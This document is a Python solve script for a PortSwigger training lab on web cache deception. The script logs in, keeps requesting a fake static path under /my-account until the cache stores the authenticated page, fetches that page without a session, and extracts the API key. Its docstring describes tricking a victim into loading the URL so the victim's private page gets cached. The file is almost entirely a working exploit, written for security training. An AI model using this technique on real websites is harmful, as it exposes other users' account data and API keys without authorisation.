#!/usr/bin/env python3
"""
Solve script for PortSwigger Lab: Exploiting path mapping for web cache deception.

Steps:
  1. Log in as wiener:peter to get a session cookie.
  2. Send GET /my-account/<suffix>.js with the session cookie until X-Cache: hit.
  3. Fetch the same URL without the session cookie to retrieve the cached response.
  4. Extract the API key from the response.

Note: In the real lab, you need to deliver the URL to the victim (carlos) via the
exploit server so that *carlos's* session is used when the cache stores the response.
This script demonstrates fetching your own cached response to confirm the technique.
"""

import argparse
import re
import time
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

DEFAULT_SUFFIX = "wcd.js"


def login(lab, username, password):
    s = requests.Session()
    s.verify = False
    r = s.get(f"{lab}/login")
    csrf = re.search(r'name="csrf" value="([^"]+)"', r.text)
    if not csrf:
        raise ValueError("CSRF token not found on login page")
    s.post(f"{lab}/login", data={
        "csrf": csrf.group(1),
        "username": username,
        "password": password,
    }, allow_redirects=True)
    return s


def poison_cache(s, lab, suffix, max_attempts=20):
    url = f"{lab}/my-account/{suffix}"
    print(f"[*] Poisoning cache at: {url}")
    for i in range(1, max_attempts + 1):
        r = s.get(url, allow_redirects=False)
        cache = r.headers.get("X-Cache", "none")
        print(f"[{i:3d}] X-Cache={cache}  Status={r.status_code}")
        if cache == "hit":
            print(f"[+] Cache hit! URL is now cached.")
            return url
        time.sleep(0.5)
    raise RuntimeError("Cache never hit — try more attempts or a different suffix.")


def fetch_cached(lab, suffix):
    url = f"{lab}/my-account/{suffix}"
    print(f"\n[*] Fetching cached response unauthenticated: {url}")
    r = requests.get(url, verify=False)
    cache = r.headers.get("X-Cache", "none")
    print(f"[*] X-Cache={cache}")
    return r.text


def extract_api_key(html):
    m = re.search(r'Your API Key is:\s*</strong>\s*([A-Za-z0-9]+)', html)
    if m:
        return m.group(1)
    # fallback pattern
    m = re.search(r'API Key[^:]*:\s*([A-Za-z0-9]{20,})', html)
    return m.group(1) if m else None


def main():
    parser = argparse.ArgumentParser(
        description="Solve Web Cache Deception Lab 1 (path mapping)"
    )
    parser.add_argument("lab_url", help="Lab base URL")
    parser.add_argument("--username", default="wiener")
    parser.add_argument("--password", default="peter")
    parser.add_argument("--suffix", default=DEFAULT_SUFFIX,
                        help="Fake static path suffix, e.g. wcd.js")
    args = parser.parse_args()

    lab = args.lab_url.rstrip("/")

    s = login(lab, args.username, args.password)
    print(f"[*] Logged in as {args.username}")

    cached_url = poison_cache(s, lab, args.suffix)

    html = fetch_cached(lab, args.suffix)
    api_key = extract_api_key(html)
    if api_key:
        print(f"\n[+] API key found: {api_key}")
        print(f"[*] Submit at: {lab}/submitSolution")
    else:
        print("[-] API key not found in response — check the cached URL manually.")
        print(f"    URL: {cached_url}")


if __name__ == "__main__":
    main()
